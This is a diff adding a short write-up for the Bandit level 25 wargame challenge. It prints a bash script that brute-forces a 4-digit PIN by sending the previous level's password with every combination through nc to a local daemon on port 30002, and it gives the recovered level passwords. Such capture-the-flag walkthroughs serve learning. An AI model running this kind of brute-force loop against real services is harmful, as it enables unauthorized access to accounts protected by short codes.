@@ -1,0 +1,38 @@
+
+*** Bandit Level 25 ***
+
+GOAL:
+-----
+1)  A daemon is listening on port 30002 and will give you the password 
+    for bandit25 if given the password for bandit24 and a secret numeric 
+    4-digit pincode. There is no way to retrieve the pincode except by 
+    going through all of the 10000 combinations, called brute-forcing.
+
+
+HINTS:
+------
+
+HELP:
+-----
+
+SOLUTIONS:
+----------
+1)  $ mkdir /tmp/hammertime
+2)  $ cd /tmp/hammertime
+3)  $ nano hammertime.sh
+4)  $ chmod +x hammertime.sh
+5)  $ ./hammertime.sh
+6)  $ sort bandit25.pass.txt | uniq -u
+
+
+Password: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+
+hammertime.sh
+#!/bin/bash
+passwd='UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'
+for a in {0..9}{0..9}{0..9}{0..9}
+do
+   echo $passwd' '$a | nc localhost 30002 >> bandit25.pass.txt &
+done
+
